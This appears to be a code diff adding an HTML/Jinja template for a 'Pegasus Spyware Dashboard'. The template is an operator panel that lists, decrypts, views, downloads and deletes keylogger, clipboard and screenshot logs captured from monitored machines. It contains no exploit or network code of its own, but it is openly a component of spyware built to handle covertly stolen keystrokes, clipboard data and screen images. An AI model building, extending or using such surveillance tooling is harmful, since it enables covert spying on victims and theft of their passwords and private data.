@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pegasus Spyware Dashboard</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: #f4f4f4;
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+        .button-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .button-container button {
+            padding: 10px 20px;
+            margin: 0 10px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+        }
+        .button-container button:hover {
+            background-color: #45a049;
+        }
+        .section {
+            margin: 20px 0;
+            padding: 20px;
+            background-color: white;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            display: none;
+        }
+        .section.active {
+            display: block;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+        }
+        th, td {
+            padding: 10px;
+            border: 1px solid #ddd;
+            text-align: left;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+        .flash-messages {
+            list-style: none;
+            padding: 0;
+            margin: 10px 0;
+        }
+        .flash-messages li {
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 5px;
+        }
+        .flash-messages .success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+        .flash-messages .error {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+    </style>
+</head>
+<body>
+    <h1>Pegasus Spyware Dashboard</h1>
+    <div class="button-container">
+        <button onclick="showSection('keylogger')">Keylogger</button>
+        <button onclick="showSection('clipboard')">Clipboard</button>
+        <button onclick="showSection('screenshot')">Screenshot</button>
+    </div>
+
+    {% with messages = get_flashed_messages(with_categories=true) %}
+        {% if messages %}
+            <ul class="flash-messages">
+                {% for category, message in messages %}
+                    <li class="{{ category }}">{{ message }}</li>
+                {% endfor %}
+            </ul>
+        {% endif %}
+    {% endwith %}
+
+    <div id="keylogger" class="section">
+        <h2>Keylogger Logs</h2>
+        <h3>Encrypted Files</h3>
+        <table>
+            <tr><th>Filename</th><th>Actions</th></tr>
+            {% for file in keylogger_encrypted %}
+                <tr>
+                    <td>{{ file }}</td>
+                    <td>
+                        <a href="{{ url_for('download_file', category='keylogger_encrypted', filename=file) }}">Download</a>
+                    </td>
+                </tr>
+            {% else %}
+                <tr><td colspan="2">No encrypted keylogger files found</td></tr>
+            {% endfor %}
+        </table>
+        <h3>Decrypted Files</h3>
+        <table>
+            <tr><th>Filename</th><th>Actions</th></tr>
+            {% for file in keylogger_decrypted %}
+                <tr>
+                    <td>{{ file }}</td>
+                    <td>
+                        <a href="{{ url_for('view_file', category='keylogger_decrypted', filename=file) }}">View</a> |
+                        <a href="{{ url_for('download_file', category='keylogger_decrypted', filename=file) }}">Download</a> |
+                        <form action="{{ url_for('delete_file', category='keylogger_decrypted', filename=file) }}" method="POST" style="display:inline;">
+                            <button type="submit">Delete</button>
+                        </form>
+                    </td>
+                </tr>
+            {% else %}
+                <tr><td colspan="2">No decrypted keylogger files found</td></tr>
+            {% endfor %}
+        </table>
+    </div>
+
+    <div id="clipboard" class="section">
+        <h2>Clipboard Logs</h2>
+        <h3>Encrypted Files</h3>
+        <table>
+            <tr><th>Filename</th><th>Actions</th></tr>
+            {% for file in clipboard_encrypted %}
+                <tr>
+                    <td>{{ file }}</td>
+                    <td>
+                        <a href="{{ url_for('download_file', category='clipboard_encrypted', filename=file) }}">Download</a>
+                    </td>
+                </tr>
+            {% else %}
+                <tr><td colspan="2">No encrypted clipboard files found</td></tr>
+            {% endfor %}
+        </table>
+        <h3>Decrypted Files</h3>
+        <table>
+            <tr><th>Filename</th><th>Actions</th></tr>
+            {% for file in clipboard_decrypted %}
+                <tr>
+                    <td>{{ file }}</td>
+                    <td>
+                        <a href="{{ url_for('view_file', category='clipboard_decrypted', filename=file) }}">View</a> |
+                        <a href="{{ url_for('download_file', category='clipboard_decrypted', filename=file) }}">Download</a> |
+                        <form action="{{ url_for('delete_file', category='clipboard_decrypted', filename=file) }}" method="POST" style="display:inline;">
+                            <button type="submit">Delete</button>
+                        </form>
+                    </td>
+                </tr>
+            {% else %}
+                <tr><td colspan="2">No decrypted clipboard files found</td></tr>
+            {% endfor %}
+        </table>
+    </div>
+
+    <div id="screenshot" class="section">
+        <h2>Screenshot Logs</h2>
+        <h3>Encrypted Files</h3>
+        <table>
+            <tr><th>Filename</th><th>Actions</th></tr>
+            {% for file in screenshot_encrypted %}
+                <tr>
+                    <td>{{ file }}</td>
+                    <td>
+                        <a href="{{ url_for('download_file', category='screenshot_encrypted', filename=file) }}">Download</a>
+                    </td>
+                </tr>
+            {% else %}
+                <tr><td colspan="2">No encrypted screenshot files found</td></tr>
+            {% endfor %}
+        </table>
+        <h3>Decrypted Files</h3>
+        <table>
+            <tr><th>Filename</th><th>Actions</th></tr>
+            {% for file in screenshot_decrypted %}
+                <tr>
+                    <td>{{ file }}</td>
+                    <td>
+                        <a href="{{ url_for('view_file', category='screenshot_decrypted', filename=file) }}">View</a> |
+                        <a href="{{ url_for('download_file', category='screenshot_decrypted', filename=file) }}">Download</a> |
+                        <form action="{{ url_for('delete_file', category='screenshot_decrypted', filename=file) }}" method="POST" style="display:inline;">
+                            <button type="submit">Delete</button>
+                        </form>
+                    </td>
+                </tr>
+            {% else %}
+                <tr><td colspan="2">No decrypted screenshot files found</td></tr>
+            {% endfor %}
+        </table>
+    </div>
+
+    <script>
+        function showSection(sectionId) {
+            document.querySelectorAll('.section').forEach(section => {
+                section.classList.remove('active');
+            });
+            document.getElementById(sectionId).classList.add('active');
+        }
+        // Show keylogger section by default
+        showSection('keylogger');
+    </script>
+</body>
+</html>
